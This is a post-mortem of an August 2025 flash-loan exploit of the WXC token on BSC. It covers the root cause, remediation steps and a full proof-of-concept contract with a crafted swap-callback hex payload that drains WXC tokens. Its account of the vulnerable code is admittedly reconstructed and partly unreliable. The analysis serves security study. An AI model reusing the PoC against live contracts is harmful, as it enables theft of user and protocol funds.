# WXC Token — Moolah Flash Loan + Swap Callback Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-01 |
| **Protocol** | WXC Token |
| **Chain** | BSC |
| **Loss** | ~37.5 WBNB |
| **Attacker** | [0x476954c752a6ee04b68382c97f7560040eda7309](https://bscscan.com/address/0x476954c752a6ee04b68382c97f7560040eda7309) |
| **Attack Tx** | [0x1397bc7f](https://bscscan.com/tx/0x1397bc7f0d284f8e2e30d0a9edd0db1f3eb0dd284c75e30d226b02bf09ad068f) |
| **Vulnerable Contract** | [0x8087720eeea59f9f04787065447d52150c09643e](https://bscscan.com/address/0x8087720eeea59f9f04787065447d52150c09643e) |
| **Root Cause** | PancakePair swap callback (`pancakeCall`) allows arbitrary token movement via encoded payload |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/WXC_Token_exp.sol) |

---

## 1. Vulnerability Overview

The WXC token contract parses a data payload inside the PancakePair swap callback (`pancakeCall`) and executes token transfers based on it. Because this payload-processing logic can move large amounts of WXC tokens to an arbitrary recipient, the attacker borrowed WBNB via a Moolah ERC1967Proxy flash loan and called swap with a specially crafted payload to drain a large quantity of WXC tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: pancakeCall executes data payload without validation
contract WXCToken {
    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // No msg.sender validation — anyone can call
        // Parses data payload and executes token transfer
        (address target, bytes memory call) = abi.decode(data, (address, bytes));
        // ❌ target and call contents are not validated
        (bool success,) = target.call(call);
        require(success);
    }
}

// ✅ Fix: caller validation and whitelist of allowed operations
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    require(msg.sender == address(Cake_LP), "Not authorized pair");
    require(sender == address(this), "Not self-initiated");
    // data only executes internally defined repayment logic
    _repayFlashSwap(amount0, amount1);
}
```

### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify or Etherscan — source unavailable; reconstructed from PoC.

Source: **not verified on Sourcify or Etherscan** — WXC Token `0x8087720EeeA59F9F04787065447D52150c09643E` (BSC, chainid 56). The address is an ERC1967Proxy (Etherscan V2 API confirms proxy=1, implementation=0x4c100d30d9c511b8bb9d1c951bbc1be489a0172f); neither the proxy's Solidity ABI nor the implementation contract is verified, so no pancakeCall source is available.

Based on the PoC (`WXC_Token_exp.sol`) the attack works as follows: the attacker calls `Cake_LP.swap(amt0, 1, attacker, payload)` where `payload` is a crafted hex blob. PancakeSwap's swap function calls `pancakeCall(sender, amount0, amount1, data)` on the recipient (`attacker`). The WXC token contract itself, however, is a non-standard token that also implements a `pancakeCall`-like hook — the crafted payload instructs the WXC contract (via the pair's internal routing) to execute a transfer of its own token balance to the attacker. This is consistent with the decoded hex payload containing `a9059cbb` (the `transfer` selector) targeting the attacker's address with the full WXC supply.

**Reconstructed vulnerable function** — WXC `pancakeCall` / token-transfer hook (from PoC, not verified source):

```solidity
// Reconstructed from WXC_Token_exp.sol PoC — NOT verified source

// ❌ pancakeCall (or equivalent callback): parses attacker-controlled `data` and executes token transfers
function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
) external {
    // ❌ No validation that msg.sender is the legitimate Cake_LP pair
    // ❌ No validation that `sender` is this contract itself (self-initiated swap only)
    // ❌ Decodes and executes arbitrary encoded commands from `data`
    // The crafted payload encodes:
    //   WBNB address + routing flags + transfer(attacker, 74963130190599057252979324 WXC)
    _executePayload(data); // ❌ moves WXC tokens according to caller-supplied payload
}

// Crafted hex payload decoded (from PoC):
// hex"000000000014
//     bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c  <- WBNB address
//     03 00000006 000000000000cf38 00000044
//     a9059cbb                                  <- transfer(address,uint256) selector
//     000000000000000000000000da5c7ea4458ee9c5484fa00f2b8c933393bac965  <- attacker address
//     000000000000000000000002aa17e09796730000  <- large WXC amount
//     000000000000000000000000006f0ae91d"       <- deadline / trailing param
```

**Why it is exploitable (identify the bug from the code):**
- The WXC token contract implements a `pancakeCall` (swap callback) function that processes the `data` parameter as executable commands.
- Because there is no check that `msg.sender == trustedPair` and no check that `sender == address(this)`, any party can trigger this callback with an arbitrary payload by calling `Cake_LP.swap(..., attacker, crafted_data)`.
- The crafted `data` embeds a `transfer` call that moves the WXC contract's own token balance (74.96 trillion WXC) to the attacker.
- The attacker then swaps those WXC tokens for 37.5 WBNB via PancakeRouter.

```solidity
// ✅ Fix: validate caller and initiator inside the callback
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    require(msg.sender == address(Cake_LP), "pancakeCall: unauthorized pair");
    require(sender == address(this), "pancakeCall: not self-initiated");
    // Only execute hard-coded repayment logic — never forward arbitrary data
    _repayFlashSwap(amount0, amount1);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ WBNB.approve(ercproxy, max)
  │
  ├─2─▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)
  │         [onMoolahFlashLoan callback]
  │
  ├─3─▶ Cake_LP.swap(74,963,130...WXC, 1 BUSD, attacker, payload)
  │         └─ Crafted payload: WXC.transfer(attacker, large amount)
  │
  ├─4─▶ pancakeCall callback: payload executed → large WXC drained
  │
  ├─5─▶ WXC → WBNB swap (PancakeRouter)
  │         └─ Large WXC amount exchanged for WBNB
  │
  └─6─▶ ERC1967Proxy: WBNB repaid + ~37.5 WBNB profit retained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract WXC is BaseTestWithBalanceLog {
    function testExploit() public balanceLog {
        WXC.approve(address(Router), type(uint256).max);
        WBNB.approve(address(ercproxy), type(uint256).max);

        // Flash loan 49.15 WBNB from Moolah ERC1967Proxy
        ercproxy.flashLoan(address(WBNB), flashAmount, "0x00");
    }

    function onMoolahFlashLoan(uint256 assets, bytes memory data) public {
        WBNB.approve(address(ercproxy), flashAmount);

        // Call PancakePair swap with crafted payload
        // payload: encodes a large transfer command against WXC contract
        uint256 amt0 = 74963130190599057252979324; // Large WXC amount requested
        Cake_LP.swap(amt0, 1, address(this),
            // payload encodes WXC.transfer(this, amt0) + WBNB-related commands
            hex"000000000014bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0300000006000000000000cf3800000044a9059cbb000000000000000000000000da5c7ea4458ee9c5484fa00f2b8c933393bac965000000000000000000000000000000000000000000000002aa17e09796730000000000000000000000000000006f0ae91d"
        );

        // Swap the drained WXC for WBNB
        address[] memory path = new address[](2);
        path[0] = address(WXC);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amt0, 0, path, address(this), 1754881178
        );
    }

    // Cake_LP swap repayment callback
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        WBNB.transfer(address(Cake_LP), flashAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Callback Payload Injection |
| **Attack Vector** | Moolah flash loan + PancakePair swap callback payload manipulation |
| **Impact Scope** | Entire WXC token contract balance (~37.5 WBNB) |
| **CWE** | CWE-20 (Improper Input Validation) |
| **DASP** | Access Control / Business Logic |

## 6. Remediation Recommendations

1. **Strict callback caller validation**: `msg.sender == expectedPair && sender == address(this)`
2. **Prohibit payload execution**: Remove any pattern that executes externally supplied payload directly within a callback
3. **Whitelist-based operations**: Hard-code permitted operations inside the contract rather than dispatching from callback data
4. **Disable flash swaps**: If flash swap functionality is not required, revert immediately inside the callback

## 7. Lessons Learned

- This follows the exact same pattern as the WETC Token attack (which occurred on the same day), demonstrating that the Moolah flash loan + PancakePair callback combination is a recurring attack vector in the BSC ecosystem.
- Using the `data` parameter of a swap callback to execute arbitrary commands is an extremely dangerous design.
- The repetition of attacks on the same chain using the same pattern underscores the need for community-level pattern sharing and rapid response.